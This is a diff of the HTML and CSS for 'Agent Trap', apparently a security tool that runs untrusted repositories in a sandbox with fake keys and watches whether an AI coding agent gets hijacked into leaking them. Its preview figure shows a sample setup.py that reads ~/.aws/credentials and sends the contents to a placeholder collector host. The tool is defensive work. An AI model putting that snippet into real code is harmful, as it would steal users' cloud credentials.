@@ -6,119 +6,340 @@
 <title>Agent Trap</title>
 <style>
   :root {
-    --bg: #f6f7f9; --panel: #ffffff; --text: #1b1f24; --muted: #5b6573; --border: #dde1e7;
-    --red: #c9272d; --red-bg: #fde8e8; --amber: #9a6700; --amber-bg: #fff4d6;
-    --green: #1a7f37; --green-bg: #dff5e3; --blue: #0b63ce; --blue-bg: #e3f0ff;
-    --code-bg: #f0f2f5; --hit: #ffd6d6; --rel: #fff0c2;
-    --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    --bg: #fafafa; --panel: #ffffff; --text: #0e0f12; --muted: #6b6f7a; --border: #e8e8ec; --border-strong: #d6d7de;
+    --hover: #f3f3f6; --sel: #efeffd; --accent: #5e5ce6; --accent-fg: #ffffff; --link: #4a48d4;
+    --red: #c9252b; --red-bg: #fdf0f0; --red-line: #e5484d;
+    --amber: #8a5a00; --amber-bg: #fff6df; --amber-line: #f5a524;
+    --green: #17734a; --green-bg: #e9f6ef; --green-line: #30a46c;
+    --code-bg: #f4f4f7; --hit: rgba(229,72,77,.13); --rel: rgba(245,165,36,.14);
+    --shadow: 0 1px 2px rgba(14,15,18,.03);
+    --shadow-hover: 0 1px 2px rgba(14,15,18,.04), 0 8px 24px -14px rgba(14,15,18,.18);
+    --mono: ui-monospace, "SF Mono", SFMono-Regular, Menlo, Consolas, monospace;
+    --sans: "Inter", -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+    --ink: #08090a; --ink-text: #f7f8f8; --ink-soft: #8a8f98;
   }
   @media (prefers-color-scheme: dark) {
     :root {
-      --bg: #0f1216; --panel: #181c22; --text: #e8ebf0; --muted: #9aa5b4; --border: #2b323c;
-      --red: #ff7b7f; --red-bg: #3a1a1c; --amber: #f0b429; --amber-bg: #3a2f10;
-      --green: #4cc26a; --green-bg: #12301b; --blue: #6cb2ff; --blue-bg: #14263d;
-      --code-bg: #12161b; --hit: #5a2326; --rel: #4a3c12;
+      --bg: #0b0c0e; --panel: #0f1013; --text: #f2f3f5; --muted: #8a8f98; --border: #1c1d21; --border-strong: #2b2d33;
+      --hover: #15161a; --sel: #191a2e; --accent: #7c7cff; --link: #a5a5ff;
+      --red: #ff7a7f; --red-bg: #1a1012; --red-line: #ff5a5f;
+      --amber: #f5b94d; --amber-bg: #181409; --amber-line: #f5a524;
+      --green: #55c98c; --green-bg: #0b1711; --green-line: #30a46c;
+      --code-bg: #08090b; --hit: rgba(255,90,95,.14); --rel: rgba(245,165,36,.13);
+      --shadow: none; --shadow-hover: 0 0 0 1px var(--border-strong);
     }
   }
   * { box-sizing: border-box; }
-  body { margin: 0; background: var(--bg); color: var(--text); font: 15px/1.5 var(--sans); }
-  header { padding: 20px 16px 0; max-width: 1180px; margin: 0 auto; }
-  h1 { margin: 0; font-size: 24px; letter-spacing: -0.01em; }
-  .tagline { color: var(--muted); margin: 4px 0 0; max-width: 70ch; }
-  .mode { display: inline-block; margin-left: 10px; font-size: 12px; padding: 2px 8px;
-    border-radius: 999px; border: 1px solid var(--border); color: var(--muted); vertical-align: middle; }
-  nav { display: flex; gap: 4px; margin-top: 16px; border-bottom: 1px solid var(--border); }
-  nav button { background: none; border: 0; padding: 10px 14px; font: inherit; color: var(--muted);
-    cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -1px; }
-  nav button[aria-selected="true"] { color: var(--text); border-bottom-color: var(--blue); font-weight: 600; }
-  main { max-width: 1180px; margin: 0 auto; padding: 16px; }
+  html { -webkit-text-size-adjust: 100%; }
+  body { margin: 0; background: var(--bg); color: var(--text); font: 15px/1.6 var(--sans); -webkit-font-smoothing: antialiased; overflow-x: hidden; }
   [hidden] { display: none !important; }
-  .grid { display: grid; grid-template-columns: 300px 1fr; gap: 16px; align-items: start; }
-  @media (max-width: 800px) { .grid { grid-template-columns: 1fr; } }
-  .card { background: var(--panel); border: 1px solid var(--border); border-radius: 10px; padding: 14px 16px; }
-  .card + .card { margin-top: 12px; }
-  .card h2 { margin: 0 0 8px; font-size: 15px; }
+  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+  svg.i { flex: none; display: inline-block; }
+  .wrap { max-width: 1120px; margin: 0 auto; padding: 0 24px; }
+  @media (max-width: 640px) { .wrap { padding: 0 16px; } }
   .muted { color: var(--muted); }
   .small { font-size: 13px; }
-  .badge { display: inline-block; font-size: 12px; font-weight: 700; letter-spacing: .03em;
-    padding: 2px 8px; border-radius: 6px; }
-  .HIJACKED { background: var(--red-bg); color: var(--red); }
-  .SUSPICIOUS { background: var(--amber-bg); color: var(--amber); }
-  .SAFE { background: var(--green-bg); color: var(--green); }
-  #list { padding: 6px; max-height: 75vh; overflow: auto; }
-  .item { display: block; width: 100%; text-align: left; background: none; border: 0; color: inherit;
-    font: inherit; padding: 10px; border-radius: 8px; cursor: pointer; }
-  .item:hover { background: var(--code-bg); }
-  .item[aria-current="true"] { background: var(--blue-bg); }
-  .item .name { display: block; font-weight: 600; margin: 4px 0 0; overflow-wrap: anywhere; }
-  .banner { display: flex; gap: 14px; align-items: center; flex-wrap: wrap; }
-  .banner .badge { font-size: 15px; padding: 6px 12px; }
-  .finding { border-left: 4px solid var(--border); padding: 4px 0 4px 12px; margin: 10px 0; }
-  .finding.error { border-color: var(--red); } .finding.warning { border-color: var(--amber); }
-  .finding.note { border-color: var(--blue); }
-  .finding .title { font-weight: 600; }
-  .chip { display: inline-block; font: 12px var(--mono); background: var(--code-bg);
-    border: 1px solid var(--border); border-radius: 6px; padding: 1px 6px; margin: 4px 6px 0 0; }
-  .code { font: 13px/1.5 var(--mono); background: var(--code-bg); border: 1px solid var(--border);
-    border-radius: 8px; overflow: auto; margin: 8px 0 0; }
-  .code .file { padding: 6px 10px; border-bottom: 1px solid var(--border); color: var(--muted); }
-  .line { display: flex; white-space: pre; }
-  .line .no { flex: none; width: 48px; text-align: right; padding-right: 10px; color: var(--muted); user-select: none; }
-  .line .src { padding-right: 12px; }
-  .line.hit { background: var(--hit); } .line.rel { background: var(--rel); }
-  table { width: 100%; border-collapse: collapse; font-size: 14px; }
-  th, td { text-align: left; padding: 6px 8px; border-bottom: 1px solid var(--border); vertical-align: top; overflow-wrap: anywhere; }
-  .compare { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-  @media (max-width: 800px) { .compare { grid-template-columns: 1fr; } }
-  .compare > div { border: 1px solid var(--border); border-radius: 8px; padding: 10px 12px; }
-  .big { font-size: 22px; font-weight: 700; }
-  .quote { font: 13px var(--mono); background: var(--code-bg); border-radius: 6px; padding: 6px 8px; overflow-wrap: anywhere; }
-  form { display: flex; gap: 8px; flex-wrap: wrap; }
-  input[type=text] { flex: 1 1 320px; padding: 10px 12px; font: inherit; color: var(--text);
-    background: var(--bg); border: 1px solid var(--border); border-radius: 8px; }
-  button.primary { padding: 10px 18px; font: inherit; font-weight: 600; color: #fff; background: #0b63ce;
-    border: 0; border-radius: 8px; cursor: pointer; }
-  button:disabled { opacity: .5; cursor: not-allowed; }
-  .demos { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px; }
-  .demos button { font: 12px var(--mono); padding: 4px 8px; border-radius: 6px; cursor: pointer;
-    background: var(--code-bg); color: var(--text); border: 1px solid var(--border); }
-  #log { font: 13px/1.6 var(--mono); margin: 0; padding: 0; list-style: none; }
-  #log li::before { content: "• "; color: var(--muted); }  /* a list of steps, not a control */
-  .error-text { color: var(--red); margin-top: 8px; }
-  pre.cmd { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; padding: 10px 12px; overflow: auto; }
-  footer { max-width: 1180px; margin: 0 auto; padding: 8px 16px 32px; color: var(--muted); font-size: 13px; }
+  .label { font-size: 11px; font-weight: 500; letter-spacing: .08em; text-transform: uppercase; color: var(--muted); margin-bottom: 10px; }
+
+  /* top bar */
+  header { background: var(--ink); color: var(--ink-text); border-bottom: 1px solid rgba(255,255,255,.04); }
+  .top { display: flex; align-items: center; gap: 28px; min-height: 60px; flex-wrap: wrap; }
+  .brand { display: flex; align-items: center; gap: 9px; font-weight: 500; letter-spacing: -.01em; font-size: 15px; color: var(--ink-text); }
+  .brand svg { color: #a5a5ff; }
+  nav { display: flex; gap: 4px; align-self: stretch; }
+  nav button { background: none; border: 0; padding: 0 12px; font: inherit; font-size: 14px; font-weight: 450; color: var(--ink-soft);
+    cursor: pointer; position: relative; min-height: 60px; transition: color .15s ease; }
+  nav button::after { content: ""; position: absolute; left: 12px; right: 12px; bottom: -1px; height: 1px; background: transparent; transition: background .15s ease; }
+  nav button:hover { color: var(--ink-text); }
+  nav button[aria-selected="true"] { color: var(--ink-text); }
+  nav button[aria-selected="true"]::after { background: var(--ink-text); }
+  header :focus-visible { outline-color: #a5a5ff; }
+  .mode { margin-left: auto; font-size: 12px; padding: 3px 10px 3px 8px; border-radius: 999px;
+    border: 1px solid rgba(255,255,255,.1); color: var(--ink-soft); display: inline-flex; align-items: center; gap: 6px; }
+  .mode::before { content: ""; width: 6px; height: 6px; border-radius: 50%; background: rgba(255,255,255,.3); }
+  .mode.live::before { background: #4fdc8f; }
+  @media (max-width: 640px) { .top { gap: 0 12px; padding-top: 8px; } nav { order: 3; width: 100%; margin: 0 -12px; } nav button { min-height: 44px; } .mode { margin-left: auto; } }
+
+  /* hero */
+  .hero { position: relative; overflow: hidden; color: var(--ink-text); padding: 76px 0 72px; background: var(--ink); border-bottom: 1px solid rgba(255,255,255,.06);
+    background-image: radial-gradient(70% 380px at 50% -120px, rgba(255,255,255,.06), transparent 70%); }
+  .hero .wrap { position: relative; }
+  .hero-copy { max-width: 760px; }
+  .hero h1 { margin: 0; font-size: 60px; line-height: 1.05; font-weight: 520; letter-spacing: -.035em; max-width: 13em; }
+  .subline { margin: 22px 0 0; font-size: 18px; line-height: 1.55; color: var(--ink-soft); max-width: 620px; }
+  @media (max-width: 640px) { .hero { padding: 44px 0 44px; } .hero h1 { font-size: 36px; } .subline { font-size: 16px; margin-top: 16px; } }
+  .scan-form { display: flex; gap: 8px; margin-top: 36px; background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.12); border-radius: 999px; padding: 5px; max-width: 640px;
+    transition: border-color .18s ease, box-shadow .18s ease; }
+  .scan-form:focus-within { border-color: #7c7cff; box-shadow: 0 0 0 3px rgba(124,124,255,.28); }
+  .scan-form input { flex: 1; min-width: 0; padding: 12px 18px; font: inherit; font-size: 16px; color: var(--ink-text); background: transparent; border: 0; outline: 0; }
+  .scan-form input::placeholder { color: #6b707a; }
+  button.primary { padding: 0 26px; font: inherit; font-weight: 500; font-size: 15px; color: #08090a; background: #f7f8f8; border: 0; border-radius: 999px; cursor: pointer; transition: transform .15s ease, background .15s ease; }
+  button.primary:hover:not(:disabled) { background: #fff; transform: translateY(-1px); }
+  button.primary:focus-visible { outline-color: #a5a5ff; outline-offset: 2px; }
+  button:disabled, input:disabled { opacity: .5; cursor: not-allowed; }
+  @media (max-width: 520px) { .scan-form { flex-direction: column; border-radius: 16px; } button.primary { padding: 13px; border-radius: 11px; } }
+  .try { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; margin-top: 18px; }
+  .try > span { color: var(--ink-soft); font-size: 13px; margin-right: 2px; }
+  .pill { display: inline-flex; align-items: center; gap: 8px; font: inherit; font-size: 13px; font-weight: 450; padding: 6px 13px; border-radius: 999px; cursor: pointer;
+    color: #c9ccd2; background: transparent; border: 1px solid rgba(255,255,255,.12); transition: transform .15s ease, border-color .15s ease, color .15s ease; }
+  .pill:hover:not(:disabled) { border-color: rgba(255,255,255,.3); color: #fff; transform: translateY(-1px); }
+  .pill:focus-visible { outline-color: #a5a5ff; }
+  .helper { margin: 18px 0 0; font-size: 13px; color: #6b707a; }
+  .hero-static { margin-top: 32px; max-width: 640px; background: rgba(255,255,255,.04); border: 1px solid rgba(255,255,255,.1); border-radius: 14px; padding: 18px 20px; }
+  .hero-static p { margin: 0 0 12px; color: #c9ccd2; }
+  pre.cmd { font: 13px var(--mono); background: rgba(0,0,0,.45); color: #f7f8f8; border: 1px solid rgba(255,255,255,.08); border-radius: 10px; padding: 12px 14px; overflow: auto; margin: 0; }
+  .hero-static .pill { margin-top: 14px; }
+
+  /* product preview (static, authored) */
+  .preview { margin: 56px auto 0; max-width: 640px; perspective: 1400px; }
+  .win { position: relative; border-radius: 16px; background: #0c0d10; border: 1px solid rgba(255,255,255,.1); overflow: hidden;
+    box-shadow: 0 30px 80px -30px rgba(124,124,255,.35), 0 0 0 1px rgba(0,0,0,.4), 0 24px 48px -24px rgba(0,0,0,.8);
+    transform: rotateX(5deg); transform-origin: 50% 100%; transition: transform .3s ease; }
+  .win:hover { transform: rotateX(0deg); }
+  .win-bar { display: flex; align-items: center; gap: 7px; padding: 11px 14px; border-bottom: 1px solid rgba(255,255,255,.07); background: rgba(255,255,255,.02); }
+  .win-bar i { width: 10px; height: 10px; border-radius: 50%; background: rgba(255,255,255,.14); }
+  .win-bar span { margin-left: 8px; font: 12px var(--mono); color: var(--ink-soft); }
+  .win-code { margin: 0; padding: 12px 0; font: 12.5px/1.75 var(--mono); color: #aeb2ba; overflow-x: auto; }
+  .win-code div { display: flex; white-space: pre; padding-right: 16px; border-left: 2px solid transparent; }
+  .win-code b { flex: none; width: 40px; padding-right: 14px; text-align: right; font-weight: 400; color: #4b4f58; user-select: none; }
+  .win-code .bad { background: rgba(255,90,95,.12); border-left-color: #ff5a5f; color: #ffd5d6; }
+  .win-code .bad.glow { animation: glow 2.6s ease-in-out infinite; }
+  @keyframes glow { 0%, 100% { background: rgba(255,90,95,.12); box-shadow: inset 0 0 0 0 rgba(255,90,95,0); } 50% { background: rgba(255,90,95,.24); box-shadow: inset 0 0 22px 0 rgba(255,90,95,.22); } }
+  .win-verdict { display: flex; align-items: center; flex-wrap: wrap; gap: 4px 12px; padding: 12px 16px; border-top: 1px solid rgba(255,255,255,.07); background: rgba(255,90,95,.05); font-size: 13px; color: #c9ccd2; }
+  .win-verdict .dot { width: 8px; height: 8px; border-radius: 50%; background: #ff5a5f; box-shadow: 0 0 10px #ff5a5f; flex: none; }
+  .win-verdict strong { font-size: 11px; font-weight: 600; letter-spacing: .08em; color: #ff7a7f; }
+  .preview-cap { margin: 16px 0 0; text-align: center; font-size: 12px; letter-spacing: .02em; color: #6b707a; }
+  @media (max-width: 640px) { .preview { margin-top: 36px; } .win { transform: none; } .win-code { font-size: 11px; } }
+
+
+  main { max-width: 1120px; margin: 0 auto; padding: 48px 24px 24px; }
+  @media (max-width: 640px) { main { padding: 32px 16px 16px; } }
+  h2.section { margin: 0 0 18px; font-size: 18px; font-weight: 550; letter-spacing: -.01em; }
+  .block-title { margin: 0; font-size: 30px; line-height: 1.15; font-weight: 500; letter-spacing: -.02em; }
+  .block-sub { margin: 8px 0 24px; color: var(--muted); font-size: 16px; }
+  .block { margin-bottom: 56px; }
+  @media (max-width: 640px) { .block-title { font-size: 26px; } .block { margin-bottom: 40px; } }
+
+  .card { background: var(--panel); border: 1px solid var(--border); border-radius: 14px; padding: 24px; box-shadow: var(--shadow); }
+  .card + .card, .card + details.card { margin-top: 16px; }
+  @media (max-width: 640px) { .card { padding: 18px 16px; } }
+
+  /* caught in the wild */
+  .wild { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 14px; }
+  @media (max-width: 960px) { .wild { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
+  @media (max-width: 520px) { .wild { grid-template-columns: minmax(0, 1fr); } }
+  .wild-card { text-align: left; font: inherit; color: inherit; cursor: pointer; display: flex; flex-direction: column; gap: 10px; padding: 18px; min-width: 0;
+    background: var(--panel); border: 1px solid var(--border); border-radius: 14px; transition: border-color .18s ease, transform .18s ease, box-shadow .18s ease; }
+  .wild-card:hover { border-color: var(--red-line); transform: translateY(-1px); box-shadow: var(--shadow-hover); }
+  .wild-name { font-family: var(--mono); font-size: 13.5px; font-weight: 500; overflow-wrap: anywhere; }
+  .wild-card .small { margin: 0; color: var(--muted); line-height: 1.5; overflow-wrap: anywhere; }
+  .wild-card .badge { align-self: flex-start; }
+
+  /* how it works */
+  .steps { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 14px; }
+  @media (max-width: 760px) { .steps { grid-template-columns: minmax(0, 1fr); } }
+  .caught { display: flex; flex-wrap: wrap; align-items: baseline; gap: 8px; margin: 10px 0 0; font-size: 13px; }
+  .caught-label { font-size: 11px; font-weight: 600; letter-spacing: .06em; text-transform: uppercase; color: var(--red-line); }
+  .caught code { font-family: var(--mono, ui-monospace, Menlo, monospace); padding: 3px 8px; border-radius: 6px;
+    background: var(--code-bg, rgba(127,127,127,.12)); overflow-wrap: anywhere; }
+  .fix-check { margin: 16px 0 0; padding: 10px 14px; border-radius: 10px; font-size: 14px; border: 1px solid transparent; }
+  .fix-check.good { background: color-mix(in srgb, #30a46c 9%, transparent); border-color: color-mix(in srgb, #30a46c 28%, transparent); }
+  .fix-check.bad { background: color-mix(in srgb, #e5484d 9%, transparent); border-color: color-mix(in srgb, #e5484d 28%, transparent); }
+  .steps > .card { margin-top: 0; padding: 28px; }
+  .step { transition: transform .18s ease, border-color .18s ease; }
+  .step:hover { transform: translateY(-1px); border-color: var(--border-strong); }
+  .step-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 22px; }
+  .step-icon { width: 38px; height: 38px; border-radius: 10px; display: grid; place-items: center; background: var(--hover); border: 1px solid var(--border); color: var(--link); }
+  .step-num { font-size: 11px; font-weight: 500; color: var(--muted); letter-spacing: .08em; }
+  .step h3 { margin: 0 0 6px; font-size: 16px; font-weight: 550; letter-spacing: -.01em; }
+  .step p { margin: 0; color: var(--muted); font-size: 14.5px; }
+
+  /* progress */
+  #progress { margin-bottom: 40px; }
+  #progress h2 { margin: 0 0 4px; font-size: 20px; font-weight: 550; letter-spacing: -.015em; overflow-wrap: anywhere; }
+  .elapsed { font-size: 13px; color: var(--muted); margin: 0 0 18px; font-variant-numeric: tabular-nums; }
+  #log { margin: 0; padding: 0; list-style: none; font-size: 15px; }
+  #log li { position: relative; padding: 0 0 12px 30px; color: var(--muted); overflow-wrap: anywhere; }
+  #log li::before { content: ""; position: absolute; left: 6px; top: 16px; bottom: -2px; width: 1px; background: var(--border-strong); }
+  #log li:last-child { padding-bottom: 0; } #log li:last-child::before { display: none; }
+  .step-dot { position: absolute; left: 0; top: 3px; width: 14px; height: 14px; border-radius: 50%; background: var(--green-line); }
+  #log li.past .step-dot::after { content: ""; position: absolute; left: 4px; top: 2px; width: 3px; height: 6px; border: solid #fff; border-width: 0 2px 2px 0; transform: rotate(45deg); }
+  #log li.now { color: var(--text); font-weight: 550; }
+  #log li.now .step-dot { background: var(--accent); animation: pulse 1.4s ease-out infinite; }
+  @keyframes pulse { 0% { box-shadow: 0 0 0 0 color-mix(in srgb, var(--accent) 60%, transparent); } 100% { box-shadow: 0 0 0 9px transparent; } }
+  .error-text { color: var(--red); margin-top: 14px; font-weight: 500; }
+  .error-text:empty { display: none; }
+
+  /* more test repositories */
+  details.demo-box { margin-top: 40px; padding: 0; }
+  details.demo-box > summary, details.more > summary { cursor: pointer; font-weight: 500; list-style: none; padding: 16px 24px; display: flex; align-items: center; gap: 10px; border-radius: 14px; transition: background .15s ease; }
+  details > summary::-webkit-details-marker { display: none; }
+  details.demo-box > summary:hover, details.more > summary:hover { background: var(--hover); }
+  .chev { width: 7px; height: 7px; border-right: 1.5px solid var(--muted); border-bottom: 1.5px solid var(--muted); transform: rotate(-45deg); transition: transform .15s ease; margin: 0 4px 0 2px; }
+  details[open] > summary .chev { transform: rotate(45deg); }
+  .demo-body { padding: 0 24px 24px; }
+  .demo-body > p { margin: 0 0 16px; }
+  .demo-group + .demo-group { margin-top: 16px; }
+  .demos { display: flex; flex-wrap: wrap; gap: 8px; }
+  .demos button { font: inherit; font-size: 13px; padding: 6px 14px; border-radius: 999px; cursor: pointer;
+    background: transparent; color: var(--text); border: 1px solid var(--border-strong); transition: transform .15s ease, border-color .15s ease; }
+  .demos button:hover:not(:disabled) { background: var(--hover); border-color: var(--accent); transform: translateY(-1px); }
+
+  /* past scans */
+  .grid { display: grid; grid-template-columns: 300px minmax(0, 1fr); gap: 28px; align-items: start; }
+  @media (max-width: 860px) { .grid { grid-template-columns: minmax(0, 1fr); gap: 20px; } }
+  #list { padding: 10px; max-height: calc(100vh - 100px); overflow: auto; position: sticky; top: 16px; }
+  .list-head { padding: 8px 12px 10px; display: flex; align-items: baseline; justify-content: space-between; }
+  .group-label { padding: 14px 12px 6px; font-size: 11px; font-weight: 500; letter-spacing: .06em; text-transform: uppercase; color: var(--muted); }
+  .list-head h2 { margin: 0; font-size: 11px; font-weight: 500; letter-spacing: .08em; text-transform: uppercase; color: var(--muted); }
+  .rows { display: block; }
+  @media (max-width: 860px) {
+    #list { position: static; max-height: none; }
+    .rows { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 6px; scroll-snap-type: x proximity; }
+    .rows .item { flex: none; width: 220px; border: 1px solid var(--border); scroll-snap-align: start; }
+  }
+  .item { display: flex; gap: 10px; align-items: center; width: 100%; text-align: left; background: none; border: 0;
+    color: inherit; font: inherit; padding: 9px 12px; border-radius: 8px; cursor: pointer; transition: background .15s ease; }
+  .item:hover { background: var(--hover); }
+  .item[aria-current="true"] { background: var(--sel); box-shadow: inset 2px 0 0 var(--accent); }
+  .item-body { min-width: 0; flex: 1; display: block; }
+  .item .name { display: block; font-weight: 500; font-size: 14px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .item .meta { display: block; font-size: 12px; color: var(--muted); }
+  .item svg { width: 18px; height: 18px; }
+  .v-icon-RED, .vi-HIJACKED { color: var(--red-line); } .vi-SUSPICIOUS { color: var(--amber-line); } .vi-SAFE { color: var(--green-line); }
+  .empty { padding: 16px; margin: 0; }
+
+  /* badges */
+  .badge { display: inline-block; font-size: 10.5px; font-weight: 600; letter-spacing: .08em; padding: 2px 9px; border-radius: 999px; line-height: 1.5; border: 1px solid currentColor; background: transparent; }
+  .badge.HIJACKED { color: var(--red); } .badge.SUSPICIOUS { color: var(--amber); } .badge.SAFE { color: var(--green); }
+
+  /* verdict */
+  .verdict { display: flex; gap: 20px; border-top: 2px solid var(--border-strong); padding: 28px; }
+  .verdict.v-HIJACKED { border-top-color: var(--red-line); background: color-mix(in srgb, var(--red-line) 4%, var(--panel)); }
+  .verdict.v-SUSPICIOUS { border-top-color: var(--amber-line); background: color-mix(in srgb, var(--amber-line) 4%, var(--panel)); }
+  .verdict.v-SAFE { border-top-color: var(--green-line); background: color-mix(in srgb, var(--green-line) 4%, var(--panel)); }
+  .v-icon { flex: none; width: 48px; height: 48px; border-radius: 12px; display: grid; place-items: center; background: var(--panel); border: 1px solid var(--border); }
+  .v-body { min-width: 0; flex: 1; }
+  .v-title { margin: 0; font-size: 28px; line-height: 1.2; font-weight: 550; letter-spacing: -.02em; }
+  .v-HIJACKED .v-title { color: var(--red); } .v-SUSPICIOUS .v-title { color: var(--amber); } .v-SAFE .v-title { color: var(--green); }
+  .v-repo { display: flex; flex-wrap: wrap; align-items: center; gap: 8px 10px; margin-top: 8px; }
+  .repo-name { font-weight: 500; overflow-wrap: anywhere; }
+  a.source { color: var(--link); text-decoration: none; font-weight: 500; overflow-wrap: anywhere; }
+  a.source:hover { text-decoration: underline; }
+  .v-body p.sentence { margin: 14px 0 0; font-size: 16px; line-height: 1.6; overflow-wrap: anywhere; }
+  .v-body ul { margin: 8px 0 0; padding-left: 22px; font-size: 15.5px; }
+  .v-body p.note { margin: 12px 0 0; font-size: 13px; color: var(--muted); }
+  .chips { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 16px; }
+  .tag { font-size: 12.5px; font-weight: 500; padding: 3px 11px; border-radius: 999px; background: transparent; border: 1px solid var(--border-strong); }
+  .tag.good { color: var(--green); border-color: var(--green-line); } .tag.bad { color: var(--red); border-color: var(--red-line); }
+  @media (max-width: 640px) { .verdict { flex-direction: column; gap: 14px; padding: 20px 16px; } .v-icon { width: 44px; height: 44px; } .v-title { font-size: 24px; } }
+
+  /* where it happens */
+  .legend { display: flex; flex-wrap: wrap; gap: 6px 18px; margin: -6px 0 14px; color: var(--muted); font-size: 13px; }
+  .key { display: inline-block; width: 10px; height: 10px; border-radius: 2px; margin-right: 6px; }
+  .key.hit { background: var(--red-line); } .key.rel { background: var(--amber-line); }
+  .file-row { display: flex; flex-wrap: wrap; align-items: center; gap: 6px 8px; margin: 0 0 8px; }
+  .filename { font: 13px var(--mono); margin-right: 4px; overflow-wrap: anywhere; }
+  button.num { font: 500 12px var(--mono); padding: 1px 9px; cursor: pointer; color: var(--muted); background: transparent; border: 1px solid var(--border-strong); border-radius: 999px; transition: transform .15s ease, border-color .15s ease, color .15s ease; }
+  button.num:hover { border-color: var(--accent); color: var(--link); transform: translateY(-1px); }
+  .lines-block p { margin: 8px 0 0; }
+  .pending { display: flex; align-items: center; gap: 10px; color: var(--muted); }
+  .spin { width: 16px; height: 16px; border-radius: 50%; border: 2px solid var(--border-strong); border-top-color: var(--accent); animation: spin .8s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .code { font: 13px/1.65 var(--mono); background: var(--code-bg); border: 1px solid var(--border); border-radius: 10px; overflow: auto; margin: 12px 0 0; max-width: 100%; }
+  .code .file { padding: 8px 14px; border-bottom: 1px solid var(--border); color: var(--muted); position: sticky; left: 0; }
+  .code .file.small { border-bottom: 0; border-top: 1px solid var(--border); }
+  .code-inner { min-width: max-content; }
+  .line { display: flex; white-space: pre; border-left: 2px solid transparent; }
+  .line .no { flex: none; width: 52px; text-align: right; padding-right: 14px; color: var(--muted); opacity: .6; user-select: none; }
+  .line .src { padding-right: 16px; }
+  .line.hit { background: var(--hit); border-left-color: var(--red-line); }
+  .line.rel { background: var(--rel); border-left-color: var(--amber-line); }
+  .line:focus { outline: 2px solid var(--accent); outline-offset: -2px; }
+  .line.flash { animation: flash 1.4s ease-out; }
+  @keyframes flash { 0%, 30% { box-shadow: inset 0 0 0 100px color-mix(in srgb, var(--accent) 38%, transparent); } 100% { box-shadow: inset 0 0 0 100px transparent; } }
+
+  /* more details */
+  details.more { padding: 0; }
+  .more-body { padding: 0 24px 24px; }
+  .more-body h3 { margin: 22px 0 8px; font-size: 11px; font-weight: 500; letter-spacing: .08em; text-transform: uppercase; color: var(--muted); padding-top: 18px; border-top: 1px solid var(--border); }
+  .more-body h3:first-child { border-top: 0; padding-top: 0; margin-top: 4px; }
+  .more-body p { margin: 6px 0; }
+  .more-body ul { list-style: none; margin: 6px 0; padding: 0; }
+  .more-body li { padding: 4px 0; overflow-wrap: anywhere; }
+  .chip { display: inline-block; font: 12px var(--mono); background: var(--code-bg); border: 1px solid var(--border); border-radius: 6px; padding: 1px 8px; margin: 2px 6px 2px 0; overflow-wrap: anywhere; }
+  .mono1 { font: 12px var(--mono); color: var(--muted); overflow-wrap: anywhere; display: block; }
+  .scan-meta { font-variant-numeric: tabular-nums; }
+  .warn-text { color: var(--amber); }
+  @media (max-width: 640px) { details.more > summary, details.demo-box > summary { padding: 16px; } .more-body, .demo-body { padding: 0 16px 20px; } }
+
+  footer { max-width: 1120px; margin: 0 auto; padding: 32px 24px 56px; color: var(--muted); font-size: 13px; text-align: center; }
+  @media (max-width: 640px) { footer { padding: 16px 16px 32px; } }
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after { animation-duration: .001ms !important; animation-iteration-count: 1 !important; transition: none !important; }
+    .win, .win:hover { transform: none; }
+  }
 </style>
 </head>
 <body>
 <header>
-  <h1>Agent Trap <span class="mode" id="mode">loading</span></h1>
-  <p class="tagline">Run an untrusted repository in a locked room with fake secrets, watch what an AI agent
-    does with it, and point to the exact line behind any leak.</p>
-  <nav role="tablist">
-    <button role="tab" id="tab-results-btn" aria-selected="true" aria-controls="tab-results">Saved results</button>
-    <button role="tab" id="tab-scan-btn" aria-selected="false" aria-controls="tab-scan">Scan a repo</button>
-  </nav>
+  <div class="wrap">
+    <div class="top">
+      <div class="brand" id="brand"></div>
+      <nav role="tablist" aria-label="Views">
+        <button role="tab" id="tab-scan-btn" aria-selected="true" aria-controls="tab-scan">Scan a repo</button>
+        <button role="tab" id="tab-past-btn" aria-selected="false" aria-controls="tab-past">Past scans</button>
+      </nav>
+      <span class="mode" id="mode">loading</span>
+    </div>
+  </div>
 </header>
 
-<main>
-  <section id="tab-results" role="tabpanel">
-    <div class="grid">
-      <div class="card" id="list" aria-label="Saved scans"></div>
-      <article id="detail"></article>
+<section id="tab-scan" role="tabpanel">
+  <div class="hero">
+    <div class="wrap">
+      <div class="hero-copy">
+        <h1>Is this repo safe to give your AI coding agent?</h1>
+        <p class="subline">Paste a GitHub link. We run the code in a locked sandbox with fake keys, let an AI agent work on it, and catch anything that tries to steal — down to the exact line.</p>
+        <div id="hero-action"></div>
+      </div>
+      <figure class="preview" aria-hidden="true">
+        <div class="win">
+          <div class="win-bar"><i></i><i></i><i></i><span>setup.py</span></div>
+          <pre class="win-code"><div><b>1</b>import os</div><div><b>2</b>from urllib.request import urlopen</div><div><b>3</b>def _build_telemetry():</div><div class="bad glow"><b>4</b>    path = os.path.expanduser("~/.aws/credentials")</div><div><b>5</b>    data = open(path).read()</div><div class="bad"><b>6</b>    urlopen("http://collector.example.invalid/v1", data)</div><div><b>7</b>_build_telemetry()</div></pre>
+          <div class="win-verdict"><span class="dot"></span><strong>MALICIOUS</strong><span>sends your AWS key to collector.example.invalid</span></div>
+        </div>
+        <figcaption class="preview-cap">What a result looks like</figcaption>
+      </figure>
     </div>
-  </section>
-
